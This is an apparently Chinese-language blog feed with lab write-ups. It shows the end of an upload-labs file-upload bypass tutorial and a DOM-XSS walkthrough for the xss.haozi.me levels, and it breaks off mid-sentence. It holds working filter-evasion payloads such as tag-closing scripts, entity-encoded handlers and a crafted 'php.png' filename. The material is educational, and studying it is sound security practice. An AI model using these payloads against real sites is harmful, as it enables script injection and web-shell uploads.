class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又成黑名单绕过了；</p><p>可以自己取名文件名，判断用的是自己取的；</p><p>不多说了，大写就能绕过；</p><p>做个简单的总结吧；</p><h3 id="黑名单绕过总结"><a href="#黑名单绕过总结" class="headerlink" title="黑名单绕过总结"></a>黑名单绕过总结</h3><p>黑名单一般考虑从后缀绕过下手，考虑特殊写法诸如php3一类的；</p><p>之后的一系列，.htaccess，.user.ini，::$DATA，正则匹配绕过；</p><h3 id="白名单总结"><a href="#白名单总结" class="headerlink" title="白名单总结"></a>白名单总结</h3><p>这就要看条件了，如果能控制文件上传的路径，可以考虑空字符截断的后缀绕过；</p><p>如果能利用文件包含，可以考虑隐藏木马于可利用的文件上；</p><p>如果可执行文件在服务端能够一闪而逝，可以考虑使用条件竞争手段；</p><p>两类文件上传绕过都应该考虑对文件原始内容的检测，如检测关键字php，检测图片大小，二次渲染，做好正则绕过；</p><p>更多的，针对于以上这些漏洞，前提一定是php和apache的版本对应，版本不对，漏洞也就不复存在了；</p><h2 id="P21"><a href="#P21" class="headerlink" title="P21"></a>P21</h2><p>这道题按成一道审计题来做；</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑：判断content-type，之后判断文件后缀，使用白名单机制，无法利用条件竞争和图片马，所以这道题绝对是后缀绕过；</p><p>只是这是白名单，如何实现后缀绕过呢？</p><p>它这里将file打散为数组，以点分割，即为前面的内容以及后缀名，这就是漏洞所利用的地方，正则绕过的一种；</p><p>运行过程：<br><img src="https://s2.loli.net/2023/12/26/pBwYxUsqWIXSNfl.png" alt="try"></p><p>可以发现，在file这段部分是利用的重点，因为最后一个png是无法改动的；</p><p>第一想法是利用空字符截断，那么要解决的就一个问题，如何在第一个元素中塞进.这个符号；</p><p>但尝试之后是不现实的；</p><p>另一个思路，end函数和count函数，它明明可以在拼接的地方就用end，为什么非要炫技写count-1索引呢？</p><p>因为学C这种强规则性的语言学傻了，php的数组它不需要是<strong>连贯</strong>的！</p><p>如令$file[0] = ‘name’， $file[7] = ‘gg’,count计算下来是2！！！</p><p>利用这个思路，让count-1去提取php就行了；</p><p>构造如下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file.ggez..php.png</span><br></pre></td></tr></table></figure><p>那么</p><p>$file[0] = ‘file’</p><p>$file[1] = ‘ggez’</p><p>$file[2] = null</p><p>$file[3] = ‘php’</p><p>$file[4] = ‘png’</p><p>end函数会提取png去比较，而count计算的时候只会计算出4，null不计入！</p><p>所以4-1=3，提取php进行最终的拼接，完成后缀绕过；</p><p>但对于有些php版本，还是会把$file[2]给计入count的计算，所以可以用bp抓包进行POST传递数组的方式：</p><p><img src="https://s2.loli.net/2023/12/26/M2nC5XNrZVxIyua.png" alt="post"></p><p>总结一下吧，很多不同的漏洞呢，实际上都和php绕过有很大的关系，是相辅相成的；</p><p>代码审计的一个目的就是快速找到php代码中可以利用的部分，就如这道题的end和count一样，并没有很快的就发现这个利用点；</p><p>至此，文件上传漏洞及其labs结束；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;环境配置问题&quot;&gt;&lt;a href=&quot;#环境配置问题&quot; class=&quot;headerlink&quot; title=&quot;环境配置问题&quot;&gt;&lt;/a&gt;环境配置问题&lt;/h2&gt;&lt;p&gt;phpStudy搭建，php版本需要选择ts的，相应的httpd-conf也需要调整，具体调整在下方给出；&lt;</summary>
      
    
    
    
    <category term="Lab" scheme="https://secondbc.github.io/SecondBC/categories/Lab/"/>
    
    
    <category term="Web" scheme="https://secondbc.github.io/SecondBC/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Xss-labs-DOM</title>
    <link href="https://secondbc.github.io/SecondBC/2024/02/26/Xss-labs-DOM/"/>
    <id>https://secondbc.github.io/SecondBC/2024/02/26/Xss-labs-DOM/</id>
    <published>2024-02-26T08:47:39.000Z</published>
    <updated>2024-02-26T08:48:17.999Z</updated>
    
    <content type="html"><![CDATA[<h2 id="类型分类"><a href="#类型分类" class="headerlink" title="类型分类"></a>类型分类</h2><ul><li>反射型：payload存在于恶意链接，没有存在于服务器内，被攻击者点击遭罪；</li><li>存储型：payload被上传到服务器，出现在留言评论交互处，访问被注入了payload的页面就会被攻击；</li><li>DOM型：基于DOM文档对象的一种漏洞，DOM型并不会和后台进行交互，是前端的安全问题，防御也只能在客户端上进行；</li></ul><h2 id="LAB说明"><a href="#LAB说明" class="headerlink" title="LAB说明"></a>LAB说明</h2><p>使用靶场：</p><p><a href="https://xss.haozi.me/#/0x00">alert(1) (haozi.me)</a></p><p>所有类型都为DOM型xss</p><h2 id="DOM型解题思路"><a href="#DOM型解题思路" class="headerlink" title="DOM型解题思路"></a>DOM型解题思路</h2><ul><li>最终的目的都是构造<code> &lt;script&gt;alert(1)&lt;/script&gt;</code>;</li><li>除了第一步写法也可以写在元素属性里，触发发生；</li><li>先给参数判断回显，看是在哪个标签里；</li><li>第一种思想：闭包标签；</li><li>遇到正则匹配无法闭包分情况：<ul><li>遇到匹配符号，能用特殊写法绕就用特殊写法</li><li>绕不过符号，尝试unicode编码绕过，双写绕过</li><li>匹配一句话，尝试中断匹配，如加空格，回车</li><li>匹配网址，可使用http协议@跳转</li></ul></li></ul><h2 id="0X00"><a href="#0X00" class="headerlink" title="0X00"></a>0X00</h2><p>服务器代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/div&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>input是参数，利用url传入；</p><p>输入参数传入js函数返回给用户html，需要实现弹窗功能则输入为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; alert(<span class="number">1</span>) &lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="0X01"><a href="#0X01" class="headerlink" title="0X01"></a>0X01</h2><p>服务器代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;textarea&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/textarea&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：textarea 是一个多行文本框，期间的内容都是它的内容，有一个思路和sql注入相似–闭包：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/textarea&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;&lt;textarea&gt;</span><br></pre></td></tr></table></figure><h2 id="0X02"><a href="#0X02" class="headerlink" title="0X02"></a>0X02</h2><p>服务器代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot;&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：input 是一个输入框，类型和输入内容分别是type及value;</p><p>同样是采用闭包，思想和sql注入相似:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt; alert(1) &lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0X03"><a href="#0X03" class="headerlink" title="0X03"></a>0X03</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则替换左右括号，可使用反引号写法绕过：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert<span class="string">`1`</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="0X04"><a href="#0X04" class="headerlink" title="0X04"></a>0X04</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Unicode编码绕过: <code>&amp;#40;</code> <code>&amp;#41;</code></p><p><strong>只可以在标签属性内使用：src，onmouseover，value…</strong></p><p>在这里使用onload，页面加载完后执行的动作；</p><p>这里说明，在””内的任何编码都会被解释为对应字符，即使””内有”的Unicode编码都会使其提前闭包！！！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;alert&amp;#40;1&amp;#41;&quot;</span>&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure><h2 id="0X05"><a href="#0X05" class="headerlink" title="0X05"></a>0X05</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">&#x27;😂&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;!-- &#x27;</span> + input + <span class="string">&#x27; --&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释绕过，但不能使用向后闭包的方式；</p><p>注释符还有一个写法： –!&gt;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="0X06"><a href="#0X06" class="headerlink" title="0X06"></a>0X06</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type=&quot;text&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入框以及特殊符号绕过，匹配内容为以auto和on开头的某个属性后面跟着=或&gt;；</p><p>正则里，.不匹配换行符，则可以如下写法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">=<span class="string">&quot;alert(1)&quot;</span></span><br></pre></td></tr></table></figure><p>onmouseover属性是当鼠标移动到元素上的时候触发；</p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则匹配html标签，并且用article包裹</p><p>由于html的写法问题，不闭合&gt;也能跑：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;alert(1)&quot;</span></span><br></pre></td></tr></table></figure><h2 id="0X08"><a href="#0X08" class="headerlink" title="0X08"></a>0X08</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">&#x27;/* \u574F\u4EBA */&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>style是css标签，里面不能跑js脚本</p><p>可以不完整按着它的写法(加个空格)写后缀就行了：</p><p>其实也可以双写绕过<code>&lt;/style&gt;</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/style &gt; &lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><h2 id="0X09"><a href="#0X09" class="headerlink" title="0X09"></a>0X09</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;input&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>匹配了一个网址，没有大小写区分以及全局匹配；</p><p>依然采用闭包思想；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.segmentfault.com &quot;&gt;&lt;/script&gt; &lt;script&gt;alert(1)&lt;/script&gt; &lt;!-- </span></span><br></pre></td></tr></table></figure><h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>替换特殊字符，无法闭包；</p><p>http协议中有种写法为：<br><a href="https://abcde@www.djdjdj.com/">https://abcde@www.djdjdj.com</a><br>用来做身份验证，实际访问后面那个网址；</p><p>又这个lab提供了一个j.js的自带alert(1)的网页，所以可以这么写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.segmentfault.com@https://xss.haozi.me/j.js</span></span><br></pre></td></tr></table></figure><p>注意艾特之后也得加上协议，如果前者用的是http，后者不能用https！！！</p><h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使得全体字符大写，标签不受影响；</p><p>但是alert收到了影响；</p><p>这里是html不受大小写影响，js会，所以使用编码绕过：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/h1&gt;&lt;body onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;&lt;/</span>body&gt;&lt;h1&gt;</span><br></pre></td></tr></table></figure><h2 id="0X0C"><a href="#0X0C" class="headerlink" title="0X0C"></a>0X0C</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在B的基础上过滤掉了script标签，无所谓还是上面的绕过方式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/h1&gt;&lt;body onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;&lt;/</span>body&gt;&lt;h1&gt;</span><br></pre></td></tr></table></figure><p>说明一下，如果用script标签的话，可以双写绕过，具体见SQLlabs；</p><h2 id="0X0D"><a href="#0X0D" class="headerlink" title="0X0D"></a>0X0D</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert(&#x27;<span class="subst">$&#123;input&#125;</span>&#x27;)</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>屏蔽了特殊符号；</p><p>回车加注释 –&gt;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="number">1</span>); </span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h2 id="0X0E"><a href="#0X0E" class="headerlink" title="0X0E"></a>0X0E</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">&#x27;&lt;_$1&#x27;</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将字符开头的内容替换为_开头，解决了html标签的闭合；</p><p>有特殊写法绕过toUpperCase：<br><code>&quot;ı&quot;.toUpperCase() == 